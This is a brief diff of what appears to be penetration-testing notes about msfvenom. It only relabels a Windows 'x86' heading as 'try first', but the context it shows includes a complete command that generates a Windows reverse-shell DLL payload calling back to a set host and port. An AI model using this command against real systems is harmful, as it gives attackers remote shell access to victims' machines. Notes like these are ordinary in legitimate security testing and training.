@@ -6,7 +6,7 @@ https://book.hacktricks.xyz/shells/shells/msfvenom
 
 ### :open_file_folder: Windows
 
-x86
+x86(try first)
 
 ```
 msfvenom -p windows/shell_reverse_tcp -f dll -o xxx.dll LHOST=192.168.10.120 LPORT=80
